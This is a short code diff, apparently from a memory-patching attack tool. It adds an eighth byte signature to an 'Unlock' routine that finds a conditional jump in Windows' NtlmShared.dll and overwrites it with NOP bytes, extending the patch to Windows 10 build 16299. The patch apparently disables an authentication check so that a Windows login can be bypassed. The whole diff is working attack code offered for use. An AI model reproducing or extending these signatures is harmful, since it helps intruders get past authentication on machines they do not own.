@@ -129,7 +129,7 @@ NTSTATUS Unlock_FindAndPatch(_In_ PKERNEL_FUNCTIONS2 fnk2, _Inout_ PBYTE pbPages
 	return E_FAIL;
 }
 
-#define NUMBER_OF_SIGNATURES 7
+#define NUMBER_OF_SIGNATURES 8
 NTSTATUS Unlock(_In_ QWORD qwAddrNtosBase)
 {
 	SIGNATURE oSigs[NUMBER_OF_SIGNATURES] = {
@@ -165,6 +165,11 @@ NTSTATUS Unlock(_In_ QWORD qwAddrNtosBase)
 		},
 		{ .chunk = { // win10x64 NtlmShared.dll (2017-03-18::10.0.15063.0)
 			{ .cbOffset = 0x615,.cb = 4,.pb = { 0xff, 0x15, 0xc5, 0x1c } },
+			{ .cbOffset = 0x61e,.cb = 4,.pb = { 0x0f, 0x85, 0x2e, 0xfb } },
+			{ .cbOffset = 0x61e,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
+		},
+		{.chunk = { // win10x64 NtlmShared.dll (2017-09-29::10.0.16299.15)
+			{ .cbOffset = 0x615,.cb = 4,.pb = { 0xff, 0x15, 0xd5, 0x1c } },
 			{ .cbOffset = 0x61e,.cb = 4,.pb = { 0x0f, 0x85, 0x2e, 0xfb } },
 			{ .cbOffset = 0x61e,.cb = 6,.pb = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 } } }
 		}
